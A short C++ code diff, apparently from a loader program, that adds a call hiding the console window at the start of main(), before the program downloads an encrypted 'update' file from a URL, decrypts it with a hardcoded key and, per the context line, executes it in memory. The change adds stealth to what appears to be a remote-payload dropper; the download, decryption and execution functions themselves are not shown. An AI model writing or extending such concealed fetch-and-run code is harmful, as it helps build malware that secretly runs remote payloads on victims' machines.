@@ -88,6 +88,8 @@ void executeInMemory(const std::vector<unsigned char>& data) {
 }
 
 int main() {
+ ShowWindow(GetConsoleWindow(), SW_HIDE);
+ 
     std::wstring url = L"https://url.to/the/encrypted_update.bin";
     std::vector<unsigned char> encryptedData = downloadFile(url);
     std::string key = "c60b710754e906a1609330e70760c2db"; // Replace with your actual key
